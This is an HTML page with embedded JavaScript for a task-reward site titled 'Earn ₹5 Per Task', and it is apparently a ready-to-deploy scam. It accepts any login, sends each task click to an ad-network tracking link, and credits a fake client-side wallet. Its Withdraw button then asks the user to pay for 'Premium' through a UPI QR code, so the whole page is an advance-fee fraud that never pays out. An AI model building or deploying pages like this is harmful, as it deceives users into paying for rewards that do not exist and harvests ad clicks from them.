<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Earn ₹5 Per Task</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9fafb;
      color: #1e3a8a;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2, h3 { text-align: center; }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #1e3a8a;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .task {
      margin: 10px 0;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    #wallet { font-weight: bold; }
    .hidden { display: none; }
    #qrPopup img { width: 100%; border-radius: 12px; }
  </style>
</head>
<body>

  <div class="container" id="loginPage">
    <h2>Login</h2>
    <input type="email" id="email" placeholder="Email" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()">Login</button>
  </div>

  <div class="container hidden" id="dashboard">
    <h3>Welcome!</h3>
    <p>Wallet Balance: ₹<span id="wallet">0</span></p>
    <div id="taskList"></div>
    <button onclick="showWithdraw()">Withdraw</button>
    <button style="margin-top:10px; background:#ef4444;" onclick="logout()">Logout</button>
  </div>

  <div class="container hidden" id="qrPopup">
    <h3>Buy Premium to Withdraw</h3>
    <p>Scan the QR to pay:</p>
    <img src="qr.jpg" alt="UPI QR" />
    <button onclick="hideWithdraw()">Close</button>
  </div>

  <script>
    let wallet = 0;
    const tasks = [
      "Download App Alpha", "Play Quiz Bravo", "Install App Charlie",
      "Answer Survey Delta", "Use App Echo", "Submit Survey Foxtrot",
      "Complete Offer Golf", "Install and Register Hotel"
    ];

    document.addEventListener('DOMContentLoaded', () => {
      if (localStorage.getItem('loggedIn') === 'true') {
        showDashboard();
      }
    });

    function login() {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;
      if (email && pass) {
        localStorage.setItem('loggedIn', 'true');
        localStorage.setItem('user_email', email);
        showDashboard();
      }
    }

    function showDashboard() {
      document.getElementById('loginPage').classList.add('hidden');
      document.getElementById('dashboard').classList.remove('hidden');
      if (!document.getElementById('taskList').children.length) {
        loadTasks();
      }
    }

    function loadTasks() {
      const container = document.getElementById('taskList');
      tasks.forEach((task, index) => {
        const div = document.createElement('div');
        div.className = 'task';
        div.innerHTML = `
          <p>${task}</p>
          <button onclick="startTask(${index})">Start Task</button>
          <button class="hidden completeBtn" onclick="completeTask(this)">
            Mark as Completed (Earn ₹5)
          </button>
        `;
        container.appendChild(div);
      });
    }

    function startTask(index) {
      const buttons = document.querySelectorAll('.task')[index].querySelectorAll('button');
      const taskUrl = `https://lakns.com/link?z=9508221&var=GitHubTaskSite&ymid=${Date.now()}`;
      window.open(taskUrl, '_blank');
      buttons[0].style.display = 'none';
      buttons[1].classList.remove('hidden');
    }

    function completeTask(btn) {
      btn.disabled = true;
      wallet += 5;
      document.getElementById('wallet').textContent = wallet;
      btn.textContent = '✅ Completed';
    }

    function showWithdraw() {
      document.getElementById('qrPopup').classList.remove('hidden');
    }

    function hideWithdraw() {
      document.getElementById('qrPopup').classList.add('hidden');
    }
